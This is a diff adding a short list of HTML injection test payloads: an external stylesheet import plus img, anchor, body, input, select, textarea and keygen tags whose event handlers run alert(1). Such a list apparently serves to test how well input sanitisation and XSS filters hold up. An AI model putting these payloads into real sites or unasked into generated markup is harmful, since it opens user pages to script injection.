@@ -1,0 +1,10 @@
+<STYLE>@import url("https://bugbound.co.uk/style.css");</STYLE>
+<img src=x onerror=alert(1)></img>
+<a href=# onclick=alert(1)>CLICKME</a>
+<body onload=alert(1)>
+<input type=text autofocus onfocus=alert(1)></input>
+<select autofocus onfocus=alert(1)></select>
+<textarea autofocus onfocus=alert(1)></textarea>
+<keygen autofocus onfocus=alert(1)></keygen>
+
+
